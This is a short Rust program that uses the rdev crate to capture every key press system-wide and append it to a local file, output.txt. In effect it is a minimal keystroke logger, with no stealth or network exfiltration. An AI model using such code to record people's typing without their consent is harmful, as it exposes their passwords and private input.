use std::fs::OpenOptions;
use std::io::prelude::*;
use std::sync::Mutex;
use lazy_static::lazy_static;
use rdev::{listen, Event, EventType};

lazy_static! {
    static ref FILE: Mutex<std::fs::File> = Mutex::new(
        OpenOptions::new()
            .write(true)
            .append(true)
            .create(true)  // 如果文件不存在，就创建一个新的文件
            .open("output.txt")
            .unwrap()
    );
}

fn main() {
    listen(|event| match event.event_type {
        EventType::KeyPress(key) => {
            let mut file = FILE.lock().unwrap();
            writeln!(file, "{:?}", key).unwrap();
        }
        _ => (),
    }).unwrap();
}
